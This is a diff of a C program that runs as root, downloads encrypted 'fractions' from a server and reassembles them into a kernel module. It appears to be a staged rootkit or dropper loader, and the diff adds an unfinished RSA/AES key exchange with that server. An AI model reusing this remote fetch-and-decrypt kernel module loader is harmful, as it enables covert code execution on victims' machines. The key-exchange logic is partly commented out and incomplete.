@@ -36,7 +36,10 @@ int main(void) {
   fraction_t *fractions = NULL;
   uint8_t *module = NULL;
   ssize_t module_size;
-
+  EVP_PKEY *pkey = NULL;
+  char *private_key = NULL;
+  char *public_key = NULL;
+  unsigned char *aes_key = NULL;
   if (geteuid() != 0) {
     log_error("This program needs to be run as root!");
     exit(1);
@@ -58,12 +61,36 @@ int main(void) {
   }
   freeaddrinfo(ainfo);
 
-  //if (http_post(sfd, "/aeskey", "text/plain", generate_publickey(),
-  //              &http_post_res) != HTTP_SUCCESS) {
-  //  log_error("Failed to send RSA Public Key\n");
-  //  goto cleanup;
-  //}
+  // if (http_post(sfd, "/aeskey", "text/plain", generate_publickey(),
+  //               &http_post_res) != HTTP_SUCCESS) {
+  //   log_error("Failed to send RSA Public Key\n");
+  //   goto cleanup;
+  // }
 
+  pkey = generate_keypair();
+  if (pkey == NULL) {
+    return EXIT_FAILURE;
+  }
+  public_key = write_public_key(pkey);
+  if (public_key == NULL) {
+    return EXIT_FAILURE;
+  }
+/*
+  if (http_post(sfd, "/publickey", "text/plain", public_key, &http_post_res) !=
+    HTTP_SUCCESS) {
+    log_error("Failed to send public key");
+    goto cleanup;
+  }
+*/
+// Wait for the server implmentation of the response
+
+/*  aes_key = decrypt_msg(pkey, (unsigned char *)http_post_res.data);
+
+  if (aes_key == NULL) {
+    log_error("Failed to decrypt data from server");
+    goto cleanup;
+  }
+*/
   if (http_get(sfd, "/", &http_fraction_res) != HTTP_SUCCESS) {
     log_error("Failed to retrieve fraction links");
     goto cleanup;
@@ -80,9 +107,7 @@ int main(void) {
     goto cleanup;
   }
 
-
-  int lines_read =
-      split_fraction_links(http_fraction_res.data, fraction_links, num_links);
+  int lines_read = split_fraction_links(http_fraction_res.data, fraction_links, num_links);
   if (lines_read < 0) {
     log_error("Failed to split fraction links");
     goto cleanup;
@@ -101,7 +126,7 @@ int main(void) {
       goto cleanup;
     }
   }
-  
+
   log_info("Downloaded fractions");
 
   qsort(fractions, lines_read, sizeof(fraction_t), compare_fractions);
@@ -110,7 +135,7 @@ int main(void) {
     print_fraction(fractions[i]);
   }
 
-  module = decrypt_lkm(fractions, num_links, &module_size);
+  module = decrypt_lkm(fractions, num_links, &module_size, aes_key);
   if (module == NULL) {
     log_error("There was an error creating the module");
     goto cleanup;
@@ -126,12 +151,15 @@ int main(void) {
   cleanup_string_array(fraction_links, num_links);
   cleanup_fraction_array(fractions, lines_read);
   free(module);
+  free(private_key);
+  free(public_key);
+  EVP_PKEY_free(pkey);
 
   close(sfd);
-  
+
   return EXIT_SUCCESS;
 
-/* There's nothing to see here, move on*/
+  /* There's nothing to see here, move on*/
 cleanup: // we accept NO comments on this. have a !nice day
   if (sfd != -1) {
     close(sfd);
@@ -149,6 +177,16 @@ cleanup: // we accept NO comments on this. have a !nice day
     http_free(&http_post_res);
   }
   free(module); // no need to check module != NULL as free(NULL) is defined by
-                // the C standard to do nothing
+  // the C standard to do nothing
+  if (private_key) {
+    free(private_key);
+  }
+  if (public_key) {
+    free(public_key);
+  }
+  if (pkey) {
+    EVP_PKEY_free(pkey);
+  }
+
   return EXIT_FAILURE;
 }
